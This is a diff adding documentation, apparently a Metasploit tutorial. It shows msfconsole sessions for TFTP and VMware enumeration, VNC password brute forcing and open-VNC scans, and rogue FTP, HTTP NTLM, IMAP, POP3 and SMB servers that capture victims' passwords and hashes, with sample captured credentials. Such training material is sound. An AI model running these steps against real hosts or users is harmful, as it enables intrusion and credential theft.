+   DICTIONARY  /usr/share/metasploit-framework/data/wordlists/tftp.txt  yes       The list of filenames
+   RHOSTS                                                               yes       The target address range or CIDR identifier
+   RPORT       69                                                       yes       The target port
+   THREADS     1                                                        yes       The number of concurrent threads
+
+ msf auxiliary(tftpbrute) > set RHOSTS 192.168.1.116
+ RHOSTS => 192.168.1.116
+ msf auxiliary(tftpbrute) > set THREADS 10
+ THREADS => 10
+ msf auxiliary(tftpbrute) > run
+
+ [*] Found 46xxsettings.txt on 192.168.1.116
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tftpbrute) >
+
+VMware
+""""""""
+
+**vmware_enum_users**
+
+This module will log into the Web API of VMware and try to enumerate all the user accounts. If the VMware instance is connected to one or more domains, it will try to enumerate domain users as well.
+
+
+::
+
+  msf > use auxiliary/scanner/vmware/vmware_enum_users
+ msf  auxiliary(vmware_enum_users) > show options
+
+ Module options (auxiliary/scanner/vmware/vmware_enum_users):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  password         yes       The password to Authenticate with.
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     443              yes       The target port (TCP)
+   SSL       true             no        Negotiate SSL/TLS for outgoing connections
+   THREADS   1                yes       The number of concurrent threads
+   USERNAME  root             yes       The username to Authenticate with.
+   VHOST                      no        HTTP server virtual host
+
+ msf  auxiliary(vmware_enum_users) >
+
+
+Running this module will output a nice list of all the groups and users on the server.
+
+::
+
+  msf  auxiliary(vmware_enum_users) > run
+
+ [+] Groups for server 192.168.1.52
+ ==============================
+
+ Name        Description
+ ----        -----------
+ daemon
+ localadmin
+ nfsnobody
+ nobody
+ root
+ tty
+ users
+ vimuser
+
+ [+] Users for server 192.168.1.52
+ =============================
+
+ Name        Description
+ ----        -----------
+ hacker      hacker
+ daemon      daemon
+ dcui        DCUI User
+ nfsnobody   Anonymous NFS User
+ nobody      Nobody
+ root        Administrator
+ vimuser     vimuser
+
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf  auxiliary(vmware_enum_users) >
+
+
+VNC
+"""""""
+
+**vnc_login**
+
+The vnc_login auxiliary module will scan an IP address or range of addresses and attempt to login via VNC with either a provided password or a wordlist.
+
+::
+
+  msf > use auxiliary/scanner/vnc/vnc_login
+ msf auxiliary(vnc_login) > show options
+
+ Module options (auxiliary/scanner/vnc/vnc_login):
+
+   Name              Current Setting                                                   Required  Description
+   ----              ---------------                                                   --------  -----------
+   BLANK_PASSWORDS   false                                                             no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                 yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                                             no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                             no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                             no        Add all users in the current database to the list
+   PASSWORD                                                                            no        The password to test
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
+   Proxies                                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                                              yes       The target address range or CIDR identifier
+   RPORT             5900                                                              yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                             yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                 yes       The number of concurrent threads
+   USERNAME                                                                     no        A specific username to authenticate as
+   USERPASS_FILE                                                                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                                             no        Try the username as the password for all users
+   USER_FILE                                                                           no        File containing usernames, one per line
+   VERBOSE           true                                                              yes       Whether to print output for all attempts
+
+
+We set our target range, threads, and perhaps most importantly, the BRUTEFORCE_SPEED value. Many newer VNC servers will automatically ban further login attempts if too many failed ones are made consecutively.
+
+::
+
+  msf auxiliary(vnc_login) > set RHOSTS 192.168.1.200-210
+ RHOSTS => 192.168.1.200-210
+ msf auxiliary(vnc_login) > set THREADS 11
+ THREADS => 11
+ msf auxiliary(vnc_login) > set BRUTEFORCE_SPEED 1
+ BRUTEFORCE_SPEED => 1
+
+With our module configuration set, we run the module. Notice in the output below that Metasploit automatically adjusts the retry interval after being notified of too many failed login attempts.
+
+
+::
+
+  msf auxiliary(vnc_login) > run
+
+ [*] 192.168.1.200:5900 - Starting VNC login sweep
+ [*] 192.168.1.204:5900 - Starting VNC login sweep
+ [*] 192.168.1.206:5900 - Starting VNC login sweep
+ [*] 192.168.1.207:5900 - Starting VNC login sweep
+ [*] 192.168.1.205:5900 - Starting VNC login sweep
+ [*] 192.168.1.208:5900 - Starting VNC login sweep
+ [*] 192.168.1.202:5900 - Attempting VNC login with password 'password'
+ [*] 192.168.1.209:5900 - Starting VNC login sweep
+ [*] 192.168.1.200:5900 - Attempting VNC login with password 'password'
+ ...snip...
+ [-] 192.168.1.201:5900, No authentication types available: Too many security failures
+ [-] 192.168.1.203:5900, No authentication types available: Too many security failures
+ [*] Retrying in 17 seconds...
+ ...snip...
+ [*] 192.168.1.203:5900 - Attempting VNC login with password 's3cr3t'
+ [*] 192.168.1.203:5900, VNC server protocol version : 3.8
+ [+] 192.168.1.203:5900, VNC server password : "s3cr3t"
+ [*] 192.168.1.201:5900 - Attempting VNC login with password 's3cr3t'
+ [*] 192.168.1.201:5900, VNC server protocol version : 3.8
+ [+] 192.168.1.201:5900, VNC server password : "s3cr3t"
+ [*] Scanned 11 of 11 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(vnc_login) >
+
+As the above output indicates, we have turned up the password for 2 systems in our scanned range which will give us a nice GUI to the target machines.
+
+
+**vnc_none_auth**
+
+The vnc_none_auth scanner, as its name implies, scans a range of hosts for VNC servers that do not have any authentication set on them.
+
+::
+
+  msf auxiliary(vnc_none_auth) > use auxiliary/scanner/vnc/vnc_none_auth
+ msf auxiliary(vnc_none_auth) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    5900             yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+To run our scan, we simply set the RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.0/24
+ RHOSTS => 192.168.1.0/24
+ msf auxiliary(vnc_none_auth) > set THREADS 50
+ THREADS => 50
+ msf auxiliary(vnc_none_auth) > run
+
+ [*] 192.168.1.121:5900, VNC server protocol version : RFB 003.008
+ [*] 192.168.1.121:5900, VNC server security types supported : None, free access!
+ [*] Auxiliary module execution completed
+
+
+In our scan results, we see that one of our targets has wide open GUI access.
+
+Server
+^^^^^^^^^^
+
+ftp
+"""""
+
+The “ftp” capture module acts as and FTP server in order to capture user credentials.
+
+::
+
+  msf > use auxiliary/server/capture/ftp
+ msf auxiliary(ftp) > show options
+
+ Module options (auxiliary/server/capture/ftp):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  21               yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+
+
+ Auxiliary action:
+
+   Name     Description
+   ----     -----------
+   Capture
+
+
+The default settings are suitable for our needs so we just run the module and entice a user to log in to our server. When we have captured the information we need, we kill the job the server is running under.
+
+::
+
+  msf auxiliary(ftp) > run
+ [*] Auxiliary module execution completed
+ [*] Server started.
+ msf auxiliary(ftp) >
+ [*] FTP LOGIN 192.168.1.195:1475 bobsmith / s3cr3t
+ [*] FTP LOGIN 192.168.1.195:1475 bsmith / s3cr3t
+ [*] FTP LOGIN 192.168.1.195:1475 bob / s3cr3tp4s
+
+ msf auxiliary(ftp) > jobs -l
+
+ Jobs
+ ====
+
+  Id  Name
+  --  ----
+  1   Auxiliary: server/capture/ftp
+
+ msf auxiliary(ftp) > kill 1
+ Stopping job: 1...
+
+ [*] Server stopped.
+ msf auxiliary(ftp) >
+
+
+**http_ntlm**
+
+The “http_ntlm” capture module attempts to quietly catch NTLM/LM Challenge hashes over HTTP.
+
+::
+
+  msf > use auxiliary/server/capture/http_ntlm
+ msf auxiliary(http_ntlm) > show options
+
+ Module options (auxiliary/server/capture/http_ntlm):
+
+   Name        Current Setting   Required  Description
+   ----        ---------------   --------  -----------
+   CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
+   CHALLENGE   1122334455667788  yes       The 8 byte challenge
+   JOHNPWFILE                    no        The prefix to the local filename to store the hashes in JOHN format
+   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     8080              yes       The local port to listen on.
+   SSL         false             no        Negotiate SSL for incoming connections
+   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                       no        The URI to use for this exploit (default is random)
+
+
+ Auxiliary action:
+
+   Name       Description
+   ----       -----------
+   WebServer
+
+
+This module has a few options available for fine-tuning, including the ability to save any captured hashes in Cain&Abel format. For our setup, we set the LOGFILE value to saves the hashes to a text file, set our SRVPORT value to listen on port 80 and configure the URIPATH to / for added realism.
+
+
+::
+
+  msf auxiliary(http_ntlm) > set LOGFILE captured_hashes.txt
+ LOGFILE => captured_hashes.txt
+ msf auxiliary(http_ntlm) > set SRVPORT 80
+ SRVPORT => 80
+ msf auxiliary(http_ntlm) > set URIPATH /
+ URIPATH => /
+ msf auxiliary(http_ntlm) > run
+ [*] Auxiliary module execution completed
+
+ [*] Using URL: http://0.0.0.0:80/
+ [*]  Local IP: http://192.168.1.101:80/
+ [*] Server started.
+ msf auxiliary(http_ntlm) >
+ [*] Request '/' from 192.168.1.195:1964
+ [*] Request '/' from 192.168.1.195:1964
+ [*] Request '/' from 192.168.1.195:1964
+ [*] 192.168.1.195: V-MAC-XP\Administrator 397ff8a937165f55fdaaa0bc7130b1a22f85252cc731bb25:af44a1131410665e6dd99eea8f16deb3e81ed4ecc4cb7d2b on V-MAC-XP
+
+ msf auxiliary(http_ntlm) > jobs -l
+
+ Jobs
+ ====
+
+  Id  Name
+  --  ----
+  0   Auxiliary: server/capture/http_ntlm
+
+ msf auxiliary(http_ntlm) > kill 0
+ Stopping job: 0...
+
+ [*] Server stopped.
+ msf auxiliary(http_ntlm) >
+
+
+As shown above, as soon as our victim browses to our server using Internet Explorer, the Administrator hash is collected without any user interaction.
+
+**imap**
+
+The “imap” capture module acts as an IMAP server in order to collect user mail credentials.
+
+::
+
+  msf > use auxiliary/server/capture/imap
+ msf auxiliary(imap) > show options
+
+ Module options (auxiliary/server/capture/imap):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  143              yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+
+
+ Auxiliary action:
+
+   Name     Description
+   ----     -----------
+   Capture
+
+
+We don’t need to do any extra configuration for this module so we let it run and then convince a user to connect to our server and collect his credentials.
+
+::
+
+  msf auxiliary(imap) > run
+ [*] Auxiliary module execution completed
+
+ [*] Server started.
+ msf auxiliary(imap) >
+ [*] IMAP LOGIN 192.168.1.195:2067 "victim" / "s3cr3t"
+ msf auxiliary(imap) > jobs -l
+
+ Jobs
+ ====
+
+  Id  Name
+  --  ----
+  0   Auxiliary: server/capture/imap
+
+ msf auxiliary(imap) > kill 0
+ Stopping job: 0...
+
+ [*] Server stopped.
+ msf auxiliary(imap) >
+
+
+**pop3**
+
+The “pop3” capture module poses as a POP3 mail server in order to capture user mail credentials.
+
+::
+
+  msf > use auxiliary/server/capture/pop3
+ msf auxiliary(pop3) > show options
+
+ Module options (auxiliary/server/capture/pop3):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  110              yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+
+
+ Auxiliary action:
+
+   Name     Description
+   ----     -----------
+   Capture
+
+
+We will leave the settings at their defaults, run the module and then convince the victim to authenticate to our server.
+
+::
+
+  msf auxiliary(pop3) > run
+ [*] Auxiliary module execution completed
+
+ [*] Server started.
+ msf auxiliary(pop3) >
+ [*] POP3 LOGIN 192.168.1.195:2084 victim / s3cr3t
+
+ msf auxiliary(pop3) > jobs -l
+
+ Jobs
+ ====
+
+  Id  Name
+  --  ----
+  1   Auxiliary: server/capture/pop3
+
+ msf auxiliary(pop3) > kill 1
+ Stopping job: 1...
+
+ [*] Server stopped.
+ msf auxiliary(pop3) >
+
+
+**smb**
+
+The “smb” capture module acts as a SMB share to capture user password hashes so they can be later exploited.
+
+::
+
+  msf > use auxiliary/server/capture/smb
+ msf auxiliary(smb) > show options
+
+ Module options (auxiliary/server/capture/smb):
+
+   Name        Current Setting   Required  Description
+   ----        ---------------   --------  -----------
+   CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
+   CHALLENGE   1122334455667788  yes       The 8 byte server challenge
+   JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format
+   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     445               yes       The local port to listen on.
+
+
+ Auxiliary action:
+
+   Name     Description
+   ----     -----------
+   Sniffer
+
+
+This module has a number of options available. We will only set the JOHNPWFILE option to save the captures hashes in John the Ripper format, run the module, and convince a user to connect to our “share”.
+
+::
+
+  msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhashes.txt
+ JOHNPWFILE => /tmp/smbhashes.txt
+ msf auxiliary(smb) > run
+ [*] Auxiliary module execution completed
+
+ [*] Server started.
+ msf auxiliary(smb) >
+ [*] Mon Mar 28 10:21:56 -0600 2011
+ NTLMv1 Response Captured from 192.168.1.195:2111
+ V-MAC-XP\Administrator OS:Windows 2002 Service Pack 2 2600 LM:Windows 2002 5.1
+ LMHASH:397ff8a937165f55fdaaa0bc7130b1a22f85252cc731bb25
+ NTHASH:af44a1131410665e6dd99eea8f16deb3e81ed4ecc4cb7d2b
+
+
+ msf auxiliary(smb) > jobs -l
+
+ Jobs
+ ====
+
+  Id  Name
+  --  ----
+  2   Auxiliary: server/capture/smb
+
+ msf auxiliary(smb) > kill 2
+ Stopping job: 2...
+
+ [*] Server stopped.
+ msf auxiliary(smb) >
